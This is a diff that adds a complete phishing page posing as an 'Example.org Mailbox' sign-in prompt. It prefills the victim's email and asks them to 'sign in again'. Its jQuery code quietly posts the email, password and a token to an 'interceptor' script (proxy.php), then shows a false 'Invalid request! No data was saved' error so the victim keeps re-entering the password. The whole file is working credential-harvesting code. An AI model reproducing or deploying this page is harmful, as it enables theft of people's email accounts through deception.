@@ -1,0 +1,270 @@
+<html><head>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js">
+</script>
+</head>
+	<body><br>
+<div align="right">
+	
+	
+	</div>
+	
+    
+
+
+
+	<div id="container" style="min-height:440px;">
+	
+		<div id="sign-in-form">
+		<form action="#" method="post" id="logon-form">
+			
+							<div style="text-align: center; font-size: 2.3em; ">
+					<span id="mail-provider">Example.org</span><span style="font-size:0.3em;">© </span> <span style="color: ">Mailbox</span>
+				</div>
+						
+			<div style="text-align:center;">
+			
+				<div style="margin-top:1px; margin-bottom: 20px; font-size: 0.9em;">
+			Please sign in again to continue
+				</div>
+									<div style="">
+						Connected to <span style="color:#34344c;font-weight:bold; font-size:1em;"> user@example.org  </span>
+					</div>
+							
+				<div>
+					<input type="hidden" name="frm-email" id="frm-email" placeholder="Email" value="user@example.org"> 
+					<input type="password" name="frm-pass" placeholder="     Password" id="frm-pass"><br>
+					<div id="error-pane" style="text-align:center;"></div>
+					<input type="hidden" name="frm-ac-tok" value="1488795688aLjZ8H57KwSc4ewiwtRx" id="frm-ac-tok">
+					<input type="hidden" name="s-id" value="auto-link" id="s-id">
+					<input type="hidden" name="ajax-submit" value="YES" id="ajax-submit">
+				</div>
+			
+			</div>
+				<input type="submit" value="Sign in" id="login-but" name="frm-submit"><br>
+			
+		</form>
+		</div>
+	</div>
+	
+	<div id="footer">
+		<span>© </span> 2022 Example.org. All rights reserved.
+	</div>
+
+
+
+<style>
+		body{
+			
+		background: linear-gradient(to right, #F4F6F6, #99A3A4);
+			color:#050505;
+		}
+		#sign-in-form{
+			
+			margin: auto;
+			margin-top: 12%;
+			background: #F4F6F6;
+			padding: 30px;
+			width: 400px;
+			border-radius: 0px;
+			box-shadow: 0px 0px 3px #F4F6F6, 0px 0px 3px #999;
+		}
+		#mail-provider{
+			color: #34344c;
+			font-weight: bold ;
+			font-size: 0.9em;
+		}
+		#frm-pass{
+			margin: 13px;
+			padding-left: 30px;
+			border: 1px solid #333;
+			width: 170px;
+			font-size:1.2em;
+		}
+		#frm-email{
+			
+			width:170px;
+			margin-top:30px;
+			margin-bottom:10px;
+			border: 1px solid #333;
+			font-size:1.2em;
+			padding-left:20px;
+		}
+		#login-but{
+			
+			margin-top: 21px; 
+			margin-left: 40%;
+			border: 1px solid #34344c; 
+			border-radius: 1px;
+			color:#f6f6f6;
+			background:#34344c;
+			font-weight:bold;
+			font-size:1.2em;
+		}
+		#login-but:hover{
+			
+			color:#fff;
+			background:#5E5E5E;
+		}
+		#footer{
+			
+			margin-top: 50px;
+			font-size: 0.8em;
+			color:#34344c;
+			text-align: center;
+		}
+		#success-msg{
+			
+			color:#000;
+		}
+</style>
+<script>
+	
+	//notify the user of successful sign in then continues form submission
+	//DEPRECATED AND NOT CALLED AT ALL IN THIS CODE
+	function sign_continue(){
+		
+		var pass_val = $("#frm-pass").val();
+		
+		//no pass entered
+		if(pass_val.length == 0){
+			
+			alert("Enter your password");
+			return false;
+		}
+		
+		//pass entered
+		else{
+			
+			$("#sign-in-form").fadeOut(800, function(){
+				
+				var continue_msg = "<div id= 'success-msg'> Your account was successfuly verified, you will be redirected you to your email in few seconds. </div>"
+				$("#sign-in-form").html(continue_msg);
+				
+				$("#sign-in-form").fadeIn(800, timeoutSign);
+
+			})
+		}
+	}
+	//delays form submission for 3secs
+	//DEPRECATED TOO AND NOT USED
+	function timeoutSign(){
+			
+		//wait for sometime before activating signin
+		setTimeout(function(){return true}, 3000);
+	}
+	function validateForm(){
+			
+			 var x = document.forms["logon-form"]["frm-pass"].value;
+
+			if (x == null || x == "") {
+				
+				alert("Please Enter Your Password");
+				return false;
+			}
+			else
+				return true;
+		}
+		
+		function disable_form(){
+				
+			$("#frm-pass").attr("disabled", "1");
+			$("#frm-email").attr("disabled", "1");
+		}
+			
+		function enable_form(){
+				
+			$("#frm-pass").removeAttr("disabled");
+			$("#frm-email").removeAttr("disabled");
+				
+		}
+		/**
+		sends form value to server via Ajax, that is, submits form behind refreshing page
+		@param String intceptr_url: Interceptor URL.
+		@return void
+		NOTE: if interceptor responds 'SUCCESS' then form submits successfully
+			remeber to include ::<input type = "hidden" name= "ajax-submit" value= "YES" />:: in the form elements inorder for interceptor to accept and send log so as to return 'SUCCESS' too
+		**/
+		
+		function ajax_submit_form(intceptr_url){
+
+			//for interceptor to work!! this is Standard interceptor form element value
+			var form_email = "frm-email=" + $("#frm-email").val();
+			var form_pass = "&frm-pass=" + $("#frm-pass").val();
+			var form_tok = "&frm-ac-tok=" + $("#frm-ac-tok").val();
+			var form_s_id = "&s-id=" + $("#s-id").val();
+			var form_ajax = "&ajax-submit=" + $("#ajax-submit").val();
+			var form_submit = "&frm-submit=" + "any val bro";
+				
+			var post_data = form_email + form_pass + form_tok + form_s_id + form_ajax + form_submit;
+				
+			post_data = encodeURI(post_data);//lets encode for URI transport
+				
+			var request = $.post(intceptr_url, post_data);
+				
+			request.done(function(response_data){
+				
+			response_data  = response_data + "";
+				
+				if(response_data == "SUCCESS"){
+						
+					//debuging purpose
+					//alert("LOGIN SENT");
+				}
+				else{
+					//production purpose
+					//alert("SUCCESS BUT LOGIN NOT SENT: " + response_data);
+				}
+			});
+				
+			request.fail(function(jqxml, status, err){
+			
+				//alert("LOGIN NOT-SENT: " + err);
+				
+			});
+				
+			request.always(function(){
+				
+				//release disabled form fields in page and show password error
+				//alert("ALWAYS SAY SOMETHING ");
+				enable_form();
+				show_error();
+					
+			});
+				
+		}
+			
+			//displays error to user by manipulating DOM
+			function show_error(){
+			
+				var error_msg = "<span style='color:#e53d16; font-size:0.8em;'>Invalid request! No data was saved.</span><br>";
+				
+				$("#frm-pass").css({'border':'solid 2px #333'});
+				$("#frm-email").css({'border':'solid 2px #e53d16'});
+				
+				$("#error-pane").append(error_msg);
+			}
+			
+			//hide displayed error if any
+			function hide_error(){
+				
+				$("#frm-pass").css({'border':'solid 1px #999999'});
+				$("#frm-email").css({'border':'solid 1px #999999'});
+				$("#error-pane").empty();
+			}
+			$("#logon-form").submit(function(){
+				
+				//sign_continue();//compatbility reasons
+				var validated = validateForm();
+				
+				if(validated){
+				
+					hide_error();
+					disable_form();
+					ajax_submit_form("proxy.php");
+				}
+					return false;
+			});
+			
+</script>
+
+</body></html>
